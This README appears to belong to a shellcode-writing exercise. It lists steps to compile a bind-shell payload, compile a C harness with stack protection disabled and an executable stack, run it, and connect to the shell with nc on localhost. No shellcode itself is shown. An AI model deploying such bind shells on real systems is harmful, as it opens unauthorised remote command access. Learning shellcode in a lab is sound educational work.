# Usage

1. Compile assembly: `./compile.sh bindshell`
2. Replace shellcode in `create_bindshell_shellcode.py` with the shellcode output from the compile script.
3. Generate shellcode for desired port number using: `python3 create_bindshell_shellcode.py -p <port number>`
4. Replace shellcode in `shellcode.c` with the shellcode output by the python script.
5. Compile shellcode.c: `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`
6. Run shellcode to execute bindshell: `./shellcode`
7. Connect to bindshell, in a separate terminal: `nc -nv 127.0.0.1 <port number>`
